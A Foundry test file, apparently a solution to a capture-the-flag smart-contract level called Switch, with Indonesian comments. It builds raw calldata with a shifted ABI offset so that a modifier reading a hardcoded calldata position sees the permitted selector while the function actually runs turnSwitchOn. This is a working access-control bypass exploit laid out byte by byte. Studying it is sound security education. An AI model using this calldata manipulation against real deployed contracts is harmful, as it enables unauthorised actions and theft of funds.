// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Switch} from "src/levels/Switch.sol";
import {SwitchFactory} from "src/levels/SwitchFactory.sol";

contract SwitchSolve is Test {
    SwitchFactory factory;
    Switch instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new SwitchFactory();
        instance = Switch(factory.createInstance(player));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        // onlyOff membaca selector dari posisi calldata 68 SECARA HARDCODE,
        // dengan asumsi offset _data = 0x20 (data mulai di byte 68).
        // Dengan offset = 0x60, decoder ABI membaca length di byte 100
        // dan _data di byte 132 — sementara modifier tetap membaca byte
        // 68, tempat kita letakkan offSelector. _data sebenarnya adalah
        // turnSwitchOn() selector.
        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 offSelector = instance.offSelector();
        bytes memory payload = abi.encodePacked(
            Switch.flipSwitch.selector, // [0:4]
            uint256(0x60), // [4:36] offset _data
            uint256(0), // [36:68] filler
            offSelector, // [68:72] yang dibaca modifier
            bytes28(uint224(0)), // [72:100] filler
            uint256(4), // [100:132] length _data
            onSelector // [132:136] _data sebenarnya
        );
        require(payload.length == 136, "payload layout salah");
        (bool ok, ) = address(instance).call(payload);
        require(ok, "flipSwitch call failed");
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
